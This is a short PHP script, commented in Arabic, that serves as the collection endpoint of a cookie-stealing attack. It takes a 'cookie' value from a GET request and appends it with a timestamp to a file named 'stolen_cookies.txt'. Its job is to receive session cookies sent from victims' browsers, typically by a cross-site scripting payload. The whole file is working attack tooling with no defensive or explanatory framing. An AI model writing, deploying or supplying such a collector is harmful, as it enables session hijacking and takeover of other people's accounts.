<?php
// التحقق مما إذا كان الكوكي موجود في طلب GET
if (isset($_GET['cookie'])) {
    // تنقية الكوكيز للتأكد من عدم وجود أكواد خبيثة
    $cookie = filter_var($_GET['cookie'], FILTER_SANITIZE_STRING);
    
    // تحديد مسار الملف الذي سيتم حفظ الكوكيز فيه
    $logFile = 'stolen_cookies.txt';
    
    // فتح الملف لكتابة الكوكيز
    $fp = fopen($logFile, 'a+');
    
    if ($fp) {
        // كتابة الكوكيز مع إضافة الطابع الزمني
        $logEntry = "Cookie: " . $cookie . " | Logged at: " . date("Y-m-d H:i:s") . "\n";
        fwrite($fp, $logEntry);
        fclose($fp);
        echo "Cookie saved successfully.";
    } else {
        echo "Failed to open log file.";
    }
} else {
    echo "No cookies found.";
}
?>